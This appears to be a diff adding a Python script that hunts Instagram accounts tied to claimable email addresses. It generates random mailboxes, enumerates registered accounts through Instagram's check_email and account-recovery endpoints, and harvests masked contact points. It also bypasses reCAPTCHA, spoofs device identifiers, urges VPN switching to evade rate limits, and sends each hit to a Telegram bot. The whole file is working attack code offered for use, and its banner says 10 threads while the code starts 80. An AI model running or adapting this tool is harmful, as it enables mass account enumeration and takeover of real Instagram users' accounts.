@@ -1,0 +1,517 @@
+import time
+from datetime import datetime
+import datetime
+import pytz
+end_datetime = datetime.datetime(2026, 6, 1)  
+iraq_timezone = pytz.timezone("Asia/Baghdad")
+
+remaining_time = end_datetime.astimezone(iraq_timezone) - datetime.datetime.now(iraq_timezone)
+print(f"[-] Remaining Time : {remaining_time}")
+
+if datetime.datetime.now(iraq_timezone) >= end_datetime.astimezone(iraq_timezone):
+    print("[!] Tool Expired contact @c0dealx ")
+    exit(0)
+import webbrowser
+import time
+
+# YouTube link open hoga
+webbrowser.open("https://youtu.be/IlCvtK5T8Ds?si=vHl0VN54XoMJRjuX")
+
+# Optional wait
+time.sleep(2)
+
+# Aage ka code
+print("Code running...")
+import requests
+import random
+import string
+import time
+import sys
+from cfonts import render
+from concurrent.futures import ThreadPoolExecutor, as_completed
+import httpx
+from colorama import Fore, Style, Back, init
+init()
+import os
+from threading import Thread, Lock
+from user_agent import generate_user_agent
+from hashlib import md5
+from bs4 import BeautifulSoup
+import base64
+import secrets
+from random import choice
+import subprocess
+import uuid
+import json
+import re
+from datetime import datetime
+
+
+try:
+    import h2
+except ImportError:
+    subprocess.check_call([sys.executable, "-m", "pip", "install", "h2"])
+    import h2
+
+try:
+    import httpx
+except:
+    subprocess.check_call([sys.executable, "-m", "pip", "install", "httpx", "httpx[http2]"])
+    import httpx
+
+try:
+    import pyfiglet
+    from rich.console import Console
+except ImportError:
+    os.system("pip install requests telethon pyfiglet rich cfonts")
+
+# ─── Color definitions ───
+b = random.randint(5, 208)
+bo = f'\x1b[38;5;{b}m'
+ED = '\x1b[38;5;208m'
+BLUE = '\033[94m'
+Z = '\033[1;31m'
+YELLOW = '\033[1;33m'
+O = '\033[2;31m'
+F = '\033[2;32m'
+A = '\033[2;34m'
+C = '\033[2;35m'
+M = '\033[2;36m'
+Y = '\033[1;34m'
+Z1 = '\033[2;31m'
+B = "\033[1;30m"
+R = "\033[1;31m"
+G = "\033[1;32m"
+Y = "\033[1;33m"
+Bl = "\033[1;34m"
+P = "\033[1;35m"
+C = "\033[1;36m"
+W = "\033[1;37m"
+X = '\033[1;33m'
+S = '\033[1;33m'
+J = '\033[2;36m'
+N = '\033[1;37m'
+U = '\x1b[1;37m'
+reset = "\033[0m"
+bold = "\033[1m"
+dim = "\033[2m"
+italic = "\033[3m"
+
+fg_lavender = "\033[38;5;183m"
+fg_mint = "\033[38;5;121m"
+fg_blue = "\033[38;5;75m"
+fg_red = "\033[38;5;196m"
+fg_pink = "\033[38;5;213m"
+fg_cyan = "\033[38;5;51m"
+fg_yellow = "\033[38;5;226m"
+fg_orange = "\033[38;5;208m"
+fg_white = "\033[38;5;255m"
+fg_green = "\033[38;5;82m"
+fg_gold = "\033[38;5;220m"
+fg_purple = "\033[38;5;141m"
+
+
+token = input("⌈━─━─━─≪ 𝑻𝑶𝑲𝑬𝑵 ≫─━─━─━⌉\n➤ ")
+print("\n")
+ID = input("⌈━─━─━─≪ 𝑰𝑫 ≫─━─━─━⌉\n➤ ")
+
+os.system("clear" if os.name == 'posix' else 'cls')
+
+used_usernames = set()
+lock = Lock()
+hit = 0
+badmail = 0
+badinsta = 0
+goodinsta = 0
+bad_user = 0
+fucked = 0
+good = 0
+taken = 0
+bad = 0
+limit = 0
+info_db = {}
+
+
+session = requests.Session()
+_session = requests.Session()
+
+
+def generate_android_ua():
+    devices = [
+        {"brand": "samsung", "model": "SM-G973F", "device": "beyond1", "board": "exynos9820", "cpu": "exynos9820"},
+        {"brand": "samsung", "model": "SM-A536B", "device": "a53x", "board": "s5e8825", "cpu": "exynos1280"},
+        {"brand": "samsung", "model": "SM-S918B", "device": "dm1q", "board": "kalama", "cpu": "qcom"},
+        {"brand": "Google", "model": "Pixel 6", "device": "raven", "board": "raven", "cpu": "gs101"},
+        {"brand": "Google", "model": "Pixel 7", "device": "panther", "board": "panther", "cpu": "gs201"},
+        {"brand": "Xiaomi", "model": "M2102J20SG", "device": "ares", "board": "mt6893", "cpu": "mtk"},
+        {"brand": "Xiaomi", "model": "Redmi Note 10", "device": "sweet", "board": "sm6150", "cpu": "qcom"},
+        {"brand": "OnePlus", "model": "ONEPLUS A6003", "device": "OnePlus6", "board": "sdm845", "cpu": "qcom"},
+        {"brand": "OPPO", "model": "CPH2371", "device": "OP4F1F", "board": "mt6893", "cpu": "mtk"},
+        {"brand": "HUAWEI", "model": "ELE-L29", "device": "HWELE", "board": "kirin980", "cpu": "hisilicon"},
+    ]
+    device = random.choice(devices)
+    android_version = random.choice(["10", "11", "12", "13", "14"])
+    api_level = {"10": "29", "11": "30", "12": "31", "13": "33", "14": "34"}[android_version]
+    dpi = random.choice(["320", "360", "394", "411", "420", "440", "450", "480"])
+    width = random.choice(["720", "1080", "1440"])
+    height = random.choice(["1520", "1600", "2280", "2340", "2400", "2560", "3200"])
+    instagram_ver = f"{random.randint(280, 340)}.0.0.{random.randint(10, 40)}.{random.randint(80, 150)}"
+    locale = random.choice(["en_US", "en_GB", "ar_SA"])
+    random_num = random.randint(300000000, 400000000)
+    ua = (f"Instagram {instagram_ver} Android ({api_level}/{android_version}; "
+          f"{dpi}dpi; {width}x{height}; {device['brand']}; {device['model']}; "
+          f"{device['device']}; {device['board']}; {locale}; {random_num})")
+    return ua
+
+
+def gen_jazoest():
+    return str(random.randint(10000, 99999))
+
+def gen_session_id():
+    part1 = ''.join(random.choices(string.ascii_lowercase + string.digits, k=5))
+    part2 = ''.join(random.choices(string.ascii_lowercase + string.digits, k=5))
+    return f"{part1}:{part2}:{random.randint(100,999)}"
+
+def gen_device_id():
+    return "android-" + secrets.token_hex(8)
+
+def gen_uuid():
+    return str(uuid.uuid4())
+
+def gen_mid():
+    return base64.urlsafe_b64encode(secrets.token_bytes(18)).decode().rstrip('=')
+
+
+def display():
+    stats = (
+        f"\r"
+        f"{fg_gold}{bold}╭━━━〔 ✦ 𝐋𝐈𝐕𝐄 𝐒𝐓𝐀𝐓𝐒 ✦ 〕━━━╮{reset}\n"
+        f"{fg_lavender}{bold}┃ ✦ 𝐇𝐈𝐓𝐒        ➤ {reset}{fg_white}{hit}{reset}\n"
+        f"{fg_green}{bold}┃ ✦ 𝐆𝐎𝐎𝐃        ➤ {reset}{fg_white}{good}{reset}\n"
+        f"{fg_red}{bold}┃ ✦ 𝐁𝐀𝐃         ➤ {reset}{fg_white}{bad}{reset}\n"
+        f"{fg_blue}{bold}┃ ✦ 𝐓𝐀𝐊𝐄𝐍       ➤ {reset}{fg_white}{taken}{reset}\n"
+        f"{fg_mint}{bold}┃ ✦ 𝐁𝐀𝐃𝐌𝐀𝐈𝐋    ➤ {reset}{fg_white}{badmail}{reset}\n"
+        f"{fg_gold}{bold}╰━━━〔 ✦ 𝐀𝐋𝐄𝐗 𝐏𝐀𝐍𝐄𝐋 ✦ 〕━━━╯{reset}"
+        f"{' ' * 10}"
+    )
+    sys.stdout.write(stats)
+    sys.stdout.flush()
+
+
+def send_telegram(msg):
+    try:
+        requests.get(
+            f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={msg}",
+            timeout=15
+        )
+    except:
+        pass
+
+
+def write_hit(msg):
+    with open('pookie.txt', 'a') as ff:
+        ff.write(f'{msg}\n')
+
+
+def solve_recaptcha_hi2():
+    try:
+        anchor_url = "https://www.google.com/recaptcha/api2/anchor?ar=1&k=6LfEUPkgAAAAAKTgbMoewQkWBEQhO2VPL4QviKct&co=aHR0cHM6Ly9oaTIuaW46NDQz&hl=en&v=XrIDux0s7SoNe6_IHkjGC92W&size=invisible"
+        params = anchor_url.split('?')[1]
+        r = requests.get(f'https://www.google.com/recaptcha/enterprise/anchor?{params}', timeout=10)
+        recaptcha_token = r.text.split('recaptcha-token" value="')[1].split('"')[0]
+        payload = f"v={params.split('v=')[1].split('&')[0]}&reason=q&c={recaptcha_token}&k=6LfEUPkgAAAAAKTgbMoewQkWBEQhO2VPL4QviKct&co=aHR0cHM6Ly9oaTIuaW46NDQz&hl=en&size=invisible"
+        headers = {
+            "User-Agent": "Mozilla/5.0",
+            "Referer": f"https://www.google.com/recaptcha/enterprise/anchor?{params}",
+            "Content-Type": "application/x-www-form-urlencoded"
+        }
+        resp = requests.post('https://www.google.com/recaptcha/enterprise/reload', data=payload, headers=headers)
+        return resp.text.split('resp","')[1].split('"')[0]
+    except:
+        return None
+
+def check_hi2_registration(email):
+    """Check via hi2.in if email is already registered on Instagram"""
+    global badmail
+    if "@" in email:
+        domain = email.split("@")[1]
+        prefix = email.split("@")[0]
+    else:
+        return None
+
+    solve = solve_recaptcha_hi2()
+    if not solve:
+        return None
+
+    data = {
+        'domain': domain,
+        'prefix': prefix,
+        'recaptcha': solve,
+    }
+    headers = {
+        'User-Agent': "Mozilla/5.0",
+        'Accept': "application/json, text/plain, */*",
+        'authorization': "Basic bnVsbA==",
+    }
+    try:
+        response = requests.post("https://hi2.in/api/custom", data=data, headers=headers, timeout=15)
+        res = response.json()
+        if "already taken" in str(res):
+            badmail += 1
+            display()
+            return True
+        else:
+            return False
+    except:
+        return None
+
+
+def get_masked_email(query):
+    url = "https://www.instagram.com/api/graphql"
+    payload = {
+        'av': "0",
+        '__d': "www",
+        '__user': "0",
+        '__a': "1",
+        '__req': "f",
+        '__hs': "20563.HYP:instagram_web_pkg.2.1...0",
+        'dpr': "3",
+        '__ccg': "GOOD",
+        '__rev': "1037676804",
+        '__s': "nz2w5z:1vm2xs:94sap8",
+        '__hsi': "7630740602831122681",
+        '__dyn': "7xeUmwlEnwn8K2Wmh0no6u5U4e0yoW3q32360CEbo1nEhw2nVE4W0qa0FE2awt81s8hwnU6a3a1YwBgao6C0Mo2swlo5q4U2zxe2GewGw9a361qw8Xwn8e87q0oa2-azo7u3u2C2O0Lo6-3u2WE5B0bK1Iwqo5p0qZ6goK10xKi2K7E5y2-1mwa6byohw5ywuU1FU",
+        '__csr': "hcfEI9NcRh48hnvNdsyaD6RnvOldSySDHBpKBLAF6ypAEzC4-ILahjF6S_ui-np4bmqhfR8gCaWFOmjgyiLt9EJ8FeiiGjFeaUO5XyjkBKUhByUGuhddpufW8yZeXx6aCxVxSaz8ycFbxVacxDCx2q8wwG8wHypp9UOawPADz8yaAgO9yVHwiqz89EhwCw05Cuw2eE1ooCU0gByU6IE1gUqU1ao0Vdw2tFnw1ud06Ca0M8fEx2UN7y4bEM3wo1JU2RwSyaOcayU6d7gy0A-9wi6320Ho0N60W8S02VS09vw0lWo",
+        '__hsdp': "gSw8N0I1apBoBrysxGCA9cxkImy-u547Fu1lg13o6u8xy458eQ2Smm50y4FEC2Gce4mE64M09g80n9w6QG09SwjE0iCw5Nw",
+        '__hblp': "05twAU5q0gum1MwuU24xS6FU98Sq0E8e88Uowda0Ek0S9U1hE0igwmuq6rwa608Gw4BwaK0BUhw9SfwXUcE34w2iE4W09iweK2O0jG1rx-8wZwaW0iq3u",
+        '__sjsp': "gSw8N0I1apBoBrysxGCA8yElaxibVUkg9e0mi1Dy8ox1i3J0JBBxg8xaq9wTe",
+        '__comet_req': "7",
+        'lsd': "AdRhedp9xNI2uNuFwNJXmbUAOw8",
+        'jazoest': "22394",
+        '__spin_r': "1037676804",
+        '__spin_b': "trunk",
+        '__spin_t': "1776670246",
+        '__crn': "comet.igweb.PolarisCAAIGAccountRecoverySearchRoute",
+        'qpl_active_flow_ids': "516759801",
+        'fb_api_caller_class': "RelayModern",
+        'fb_api_req_friendly_name': "CAAIGAccountSearchViewQuery",
+        'server_timestamps': "true",
+        'variables': '{"params":{"event_request_id":"' + str(uuid.uuid4()) + '","next_uri":"","search_query":"' + query + '","waterfall_id":"' + str(uuid.uuid4()) + '"}}',
+        'doc_id': "26178667145161478",
+        'fb_api_analytics_tags': '["qpl_active_flow_ids=516759801"]'
+    }
+    headers = {
+        'User-Agent': "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
+        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
+        'sec-ch-ua-model': '""',
+        'x-ig-app-id': "936619743392459",
+        'x-ig-max-touch-points': "5",
+        'sec-ch-ua-mobile': "?0",
+        'x-fb-friendly-name': "CAAIGAccountSearchViewQuery",
+        'x-fb-lsd': "AdRhedp9xNI2uNuFwNJXmbUAOw8",
+        'sec-ch-ua-platform-version': '""',
+        'x-asbd-id': "359341",
+        'sec-ch-ua-full-version-list': '"Chromium";v="139.0.7339.0", "Not;A=Brand";v="99.0.0.0"',
+        'sec-ch-prefers-color-scheme': "dark",
+        'x-csrftoken': "o_6jxh33ZvsQ2eFMyRaM_q",
+        'sec-ch-ua-platform': '"Linux"',
+        'origin': "https://www.instagram.com",
+        'sec-fetch-site': "same-origin",
+        'sec-fetch-mode': "cors",
+        'sec-fetch-desc': "empty",
+        'referer': "https://www.instagram.com/accounts/password/reset/",
+        'accept-language': "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7",
+        'Cookie': "csrftoken=o_6jxh33ZvsQ2eFMyRaM_q; datr=YMnlaTJAraHY5ADdYH8UqsTG; ig_did=2046A480-DF50-4660-A5CD-DC58F57C7A1C; mid=aeXJYAABAAGoDWzGwrGALDqzE3Np; dpr=3.558248996734619; wd=774x749"
+    }
+    try:
+        response = requests.post(url, data=payload, headers=headers, timeout=20)
+        data = response.json()
+        for cp in data.get("data", {}).get("caa_ar_ig_account_search", {}).get("contact_points", []):
+            if cp.get("type") == "EMAIL":
+                return cp.get("contact_point")
+        return None
+    except:
+        return None
+
+
+def rest(email):
+    global hit, badmail, badinsta, good, bad, goodinsta
+    try:
+        os.system('clear' if os.name == 'posix' else 'cls')
+        tt = (f'''
+{YELLOW}╭═━──────༺𓆩✧𓆪༻──────━═╮{reset}
+
+{YELLOW}┃{F} 𝑯𝑰𝑻𝑺        ➤ {hit}
+{YELLOW}┃{YELLOW} 𝑩𝑨𝑫         ➤ {badmail}
+{YELLOW}┃{ED} 𝑼𝑺𝑬𝑹        ➤ {email}
+{YELLOW}┃{R} 𝑮𝑶𝑶𝑫        ➤ {goodinsta}
+
+{YELLOW}╰═━──────༺𓆩✧𓆪༻──────━═╯{reset}
+        ''')
+        print(tt)
+
+        android_ua = generate_android_ua()
+
+
+        url = "https://i.instagram.com/api/v1/users/check_email/"
+        response = httpx.Client(http2=True).post(
+            url,
+            data=f"email={email}",
+            headers={
+                'User-Agent': "Instagram 166.0.0.30.120 Android (30/11; 1440dpi; 2560x1440; samsung; SM-G973F; x86_64; tablet; en_US; kirin)",
+                'content-type': "application/x-www-form-urlencoded; charset=UTF-8"
+            }
+        )
+
+        if 'email_is_taken' in response.text:
+
+            registered = check_hi2_registration(email)
+            if registered is True:
+                status = "ALREADY REGISTERED"
+            elif registered is False:
+                status = "NOT REGISTERED"
+            else:
+                status = "UNKNOWN"
+
+
+            api_session_id = gen_session_id()
+
+
+            masked_email = get_masked_email(email)
+            if not masked_email:
+                masked_email = "None"
+
+            hit += 1
+            good += 1
+            goodinsta += 1
+            dom = email.split("@")[1]
+
+            msg = f'''
+⌈━─━─━─≪ 𝑨 𝑳 𝑬 𝑿 x PT7 ≫─━─━─━⌉
+
+〔 {dom} 〕
+
+✦ 𝑬𝒎𝒂𝒊𝒍 ➤ {email}
+✦ 𝑺𝑻𝑨𝑻𝑼𝑺 ➤ {status}
+✦ 𝑴𝒂𝒔𝒌𝒆𝒅 ➤ {masked_email}
+✦ 𝑨𝑷𝑰 𝑺𝒆𝒔𝒔𝒊𝒐𝒏 ➤ {api_session_id}
+
+⌊━─━─━─≪ 𝑨 𝑳 𝑬 𝑿 x Pt7 ≫─━─━─━⌋
+'''
+            write_hit(msg)
+            send_telegram(msg)
+            display()
+        else:
+            bad += 1
+            badinsta += 1
+            display()
+
+    except Exception as e:
+        bad += 1
+        display()
+
+
+def lookup_bloks(email):
+    global good, bad, limit
+    url = "https://i.instagram.com/api/v1/bloks/async_action/com.bloks.www.caa.ar.search.async/"
+    device = str(uuid.uuid4())
+    family = str(uuid.uuid4())
+    android = "android-" + secrets.token_hex(8)
+    payload = {
+        'params': '{"client_input_params":{"aac":"{\\"aac_init_timestamp\\":' + str(int(time.time())) + ',\\"aacjid\\":\\"' + str(uuid.uuid4()) + '\\",\\"aaccs\\":\\"' + secrets.token_urlsafe(32) + '\\"}","flash_call_permissions_status":{"READ_PHONE_STATE":"PERMANENTLY_DENIED","READ_CALL_LOG":"DENIED","ANSWER_PHONE_CALLS":"DENIED"},"was_headers_prefill_available":0,"network_bssid":null,"sfdid":"","fetched_email_token_list":{},"search_query":"' + email + '","auth_secure_device_id":"","ig_oauth_token":[],"cloud_trust_token":null,"was_headers_prefill_used":0,"sso_accounts_auth_data":[],"encrypted_msisdn":"","device_network_info":null,"text_input_id":"akyuf0:61","zero_balance_state":null,"android_build_type":"release","accounts_list":[],"is_oauth_without_permission":0,"ig_android_qe_device_id":"' + device + '","gms_incoming_call_retriever_eligibility":"client_not_supported","search_screen_type":"email_or_username","is_whatsapp_installed":1,"lois_settings":{"lois_token":""},"ig_vetted_device_nonce":null,"headers_infra_flow_id":"","fetched_email_list":[]},"server_params":{"event_request_id":"' + str(uuid.uuid4()) + '","is_from_logged_out":0,"layered_homepage_experiment_group":null,"device_id":"' + android + '","login_surface":"login_home","waterfall_id":"' + str(uuid.uuid4()) + '","INTERNAL__latency_qpl_instance_id":6.3987980400102E13,"is_platform_login":0,"context_data":"","login_entry_point":"logged_out","INTERNAL__latency_qpl_marker_id":36707139,"family_device_id":"' + family + '","offline_experiment_group":"caa_iteration_v3_perf_ig_4","access_flow_version":"pre_mt_behavior","is_from_logged_in_switcher":0,"qe_device_id":"' + device + '"}}',
+        'bk_client_context': '{"bloks_version":"5e47baf35c5a270b44c8906c8b99063564b30ef69779f3dee0b828bee2e4ef5b","styles_id":"instagram"}',
+        'bloks_versioning_id': "5e47baf35c5a270b44c8906c8b99063564b30ef69779f3dee0b828bee2e4ef5b"
+    }
+    headers = {
+        'User-Agent': "Instagram 370.1.0.43.96 Android (34/14; 450dpi; 1080x2207; samsung; SM-A235F; a23; qcom; en_IN; 704872281)",
+        'accept-language': "en-IN, en-US",
+        'x-bloks-version-id': "5e47baf35c5a270b44c8906c8b99063564b30ef69779f3dee0b828bee2e4ef5b",
+        'x-fb-friendly-name': "IgApi: bloks/async_action/com.bloks.www.caa.ar.search.async/",
+        'x-ig-android-id': android,
+        'x-ig-app-id': "567067343352427",
+        'x-ig-app-locale': "en_IN",
+        'x-ig-client-endpoint': "com.bloks.www.caa.ar.search",
+        'x-ig-device-id': device,
+        'x-ig-family-device-id': family,
+        'x-ig-timezone-offset': str(datetime.now().astimezone().utcoffset().total_seconds()),
+        'x-mid': base64.urlsafe_b64encode(secrets.token_bytes(18)).decode().rstrip('='),
+        'x-pigeon-rawclienttime': str(time.time()),
+        'x-pigeon-session-id': f"UFS-{uuid.uuid4()}-0",
+    }
+    try:
+        response = requests.post(url, data=payload, headers=headers, timeout=20)
+        if f"{email}" in response.text:
+            good += 1
+            display()
+
+            registered = check_hi2_registration(email)
+            status = "ALREADY REGISTERED" if registered else "NOT REGISTERED" if registered is False else "UNKNOWN"
+            api_session_id = gen_session_id()
+            masked_email = get_masked_email(email) or "None"
+
+            dom = email.split("@")[1]
+            msg = f'''
+⌈━─━─━─≪ 𝑨 𝑳 𝑬 𝑿 x Pt7 ≫─━─━─━⌉
+
+〔 {dom} 〕
+
+✦ 𝑬𝒎𝒂𝒊𝒍 ➤ {email}
+✦ 𝑺𝑻𝑨𝑻𝑼𝑺 ➤ {status}
+✦ 𝑴𝒂𝒔𝒌𝒆𝒅 ➤ {masked_email}
+✦ 𝑨𝑷𝑰 𝑺𝒆𝒔𝒔𝒊𝒐𝒏 ➤ {api_session_id}
+
+⌊━─━─━─≪ 𝑨 𝑳 𝑬 𝑿 x Pt7 ≫─━─━─━⌋
+'''
+            write_hit(msg)
+            send_telegram(msg)
+            hit += 1
+        elif 'Fucked up babes' in response.text:
+            limit += 1
+            display()
+        else:
+            bad += 1
+            display()
+    except:
+        bad += 1
+        display()
+
+
+def POOKIE_ALEX():
+    while True:
+        user1 = ''.join(random.choice('abcdefghijklmnopqrstuvwxyz') for _ in range(6))
+        user2 = ''.join(random.choice('abcdefghijklmnopqrstuvwxyz') for _ in range(6))
+        chosen_user = random.choice([user1, user2])
+
+        with lock:
+            if chosen_user in used_usernames:
+                continue
+            used_usernames.add(chosen_user)
+
+        chos = random.choice(["@hi2.in", "@telegmail.com"])
+        email = chosen_user + chos
+
+
+        try:
+            rest(email)
+        except:
+            try:
+                lookup_bloks(email)
+            except:
+                pass
+
+
+print(f"{fg_red}{bold}𖤐 𝗣𝗟𝗘𝗔𝗦𝗘 𝗧𝗢𝗚𝗚𝗟𝗘 𝗔𝗜𝗥𝗣𝗟𝗔𝗡𝗘 𝗠𝗢𝗗𝗘 𝗢𝗥 𝗖𝗛𝗔𝗡𝗚𝗘 𝗩𝗣𝗡 𝗦𝗘𝗥𝗩𝗘𝗥 𝗪𝗛𝗜𝗟𝗘 𝗥𝗨𝗡𝗡𝗜𝗡𝗚 𝗦𝗖𝗥𝗜𝗣𝗧 𖤐{reset}")
+time.sleep(2)
+
+print(f"\n{fg_gold}{bold}[*] Starting with 10 threads...{reset}\n")
+
+for _ in range(80):
+    Thread(target=POOKIE_ALEX, daemon=True).start()
+
+
+try:
+    while True:
+        time.sleep(60)
+except KeyboardInterrupt:
+    print(f"\n{fg_red}{bold}[!] BYEE BYEE..{reset}")
+    sys.exit(0)
